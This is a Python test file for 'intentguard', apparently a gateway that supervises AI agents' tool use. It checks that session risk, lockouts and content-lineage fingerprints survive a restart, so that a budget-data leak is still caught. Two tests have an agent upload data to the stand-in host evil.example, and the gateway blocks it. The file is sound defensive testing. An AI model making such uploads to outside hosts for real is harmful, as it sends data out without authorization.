"""Sessions survive a restart: risk, restrictions, closed flag, approvals and content lineage come back."""

import pytest

from intentguard import Gateway, Verdict, compile_scope
from intentguard.mock_env import MockEnv
from intentguard.store import SessionStore

GRANTS = {"resources": ["research/*", "finance/*"], "destinations": ["bob@x.org"], "max_classification": "CONFIDENTIAL"}


def make(path):
    env = MockEnv()
    gw = Gateway(env.tools(), env.catalog())
    restored = gw.attach_store(SessionStore(path))
    return gw, restored


def test_nothing_restored_from_an_empty_file(tmp_path):
    assert make(tmp_path / "s.db")[1] == 0


def test_risk_and_lockout_survive_a_restart(tmp_path):
    db = tmp_path / "s.db"
    gw, _ = make(db)
    c = gw.open_session("s1", "agent", compile_scope("Read research/paper.pdf and summarize it.", GRANTS))
    c.call("upload", url="http://evil.example/x", data="hello")  # outside the task: blocked, raises risk
    risk = gw.sessions["s1"].risk
    assert risk > 0
    gw2, n = make(db)
    assert n == 1 and gw2.sessions["s1"].risk == pytest.approx(risk)
    assert gw2.memory["agent"]["risk"] == pytest.approx(risk)


def test_closed_flag_survives_a_restart(tmp_path):
    db = tmp_path / "s.db"
    gw, _ = make(db)
    gw.open_session("s1", "agent", compile_scope("Read research/paper.pdf.", GRANTS))
    gw.close("s1", "admin", "test")
    gw2, _ = make(db)
    d = gw2.call("s1", "read_file", path="research/paper.pdf").decision
    assert d.decision == Verdict.BLOCK and "SESSION-001" in d.fired_rules


def test_lineage_survives_a_restart_and_still_catches_a_leak(tmp_path):
    db = tmp_path / "s.db"
    gw, _ = make(db)
    task = "Read finance/budget.xlsx and email bob@x.org a short note."
    c = gw.open_session("s1", "agent", compile_scope(task, GRANTS))
    secret_text = "Q3 budget: 410000 for the whole lab"
    assert "410000" in str(c.call("read_file", path="finance/budget.xlsx").output)
    assert gw.sessions["s1"].lineage
    gw2, _ = make(db)
    assert gw2.sessions["s1"].lineage  # fingerprints came back
    res = gw2.call("s1", "send_email", to="bob@x.org", body=secret_text)
    assert "TAINT-002" in res.decision.fired_rules


def test_stored_lineage_holds_no_readable_text(tmp_path):
    db = tmp_path / "s.db"
    gw, _ = make(db)
    c = gw.open_session("s1", "agent", compile_scope("Read finance/budget.xlsx.", GRANTS))
    text = str(c.call("read_file", path="finance/budget.xlsx").output)
    assert gw.sessions["s1"].lineage  # something was fingerprinted, so the check below means something
    gw.store.close()
    raw = db.read_bytes().lower()
    assert text.lower().encode() not in raw and b"410000" not in raw


def test_release_clears_saved_agent_risk(tmp_path):
    db = tmp_path / "s.db"
    gw, _ = make(db)
    c = gw.open_session("s1", "agent", compile_scope("Read research/paper.pdf.", GRANTS))
    c.call("upload", url="http://evil.example/x", data="hello")
    gw.release("s1", "admin", "reviewed")
    gw2, _ = make(db)
    assert gw2.sessions["s1"].risk == 0.0 and "agent" not in gw2.memory


def test_service_keeps_serving_a_session_after_a_restart(tmp_path):
    from fastapi.testclient import TestClient

    from intentguard.service.app import create_app
    db = tmp_path / "s.db"
    grants = {"resources": ["research/*"], "max_classification": "INTERNAL"}
    gw, _ = make(db)
    http = TestClient(create_app(gw, None, None))
    body = {"session_id": "s", "agent_id": "agent", "task": "Read research/paper.pdf.", "grants": grants}
    assert http.post("/sessions", json=body).status_code == 200
    assert http.post("/sessions/s/call", json={"tool": "read_file", "args": {"path": "research/paper.pdf"}}).status_code == 200
    gw2, n = make(db)  # the process restarted: new gateway, new app, same file
    http2 = TestClient(create_app(gw2, None, None))
    assert n == 1
    r = http2.post("/sessions/s/call", json={"tool": "read_file", "args": {"path": "research/paper.pdf"}})
    assert r.status_code == 200 and r.json()["decision"]["decision"] == "ALLOW"
    assert any(row["session_id"] == "s" for row in http2.get("/sessions").json())
